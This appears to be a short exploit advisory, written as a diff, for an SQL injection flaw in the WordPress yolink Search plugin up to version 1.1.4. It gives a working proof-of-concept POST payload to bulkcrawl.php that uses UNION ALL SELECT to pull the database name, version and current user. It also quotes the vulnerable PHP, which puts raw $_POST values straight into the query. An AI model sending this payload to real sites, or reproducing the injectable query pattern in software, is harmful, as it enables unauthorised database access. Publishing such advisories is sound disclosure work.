@@ -1,0 +1,30 @@
+# Exploit Title: WordPress yolink Search plugin <= 1.1.4 SQL Injection Vulnerability
+# Date: 2011-08-30
+# Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+# Software Link: http://downloads.wordpress.org/plugin/yolink-search.1.1.4.zip
+# Version: 1.1.4 (tested)
+
+---------------
+PoC (POST data)
+---------------
+http://www.site.com/wp-content/plugins/yolink-search/includes/bulkcrawl.php
+ page=-1&from_id=-1 UNION ALL SELECT CONCAT_WS(CHAR(58),database(),version(),current_user()),NULL--%20&batch_size=-1
+
+---------------
+Vulnerable code
+---------------
+$post_type_in = array();
+
+if( isset( $_POST['page'] ) )
+{
+    $post_type_in[] = '"page"';
+}
+if( isset( $_POST['post'] ) )
+{
+    $post_type_in[] = '"post"';
+}
+$post_type_in = '(' . implode(',', $post_type_in) . ')';
+$id_from = $_POST['from_id'];
+$batch_size = $_POST['batch_size'];
+
+$post_recs = $wpdb->get_results( $wpdb->prepare( "SELECT ID,GUID FROM $wpdb->posts WHERE post_status='publish' AND post_type IN $post_type_in AND ID > $id_from order by ID asc LIMIT $batch_size" ) ); //misusage of $wpdb->prepare() :)
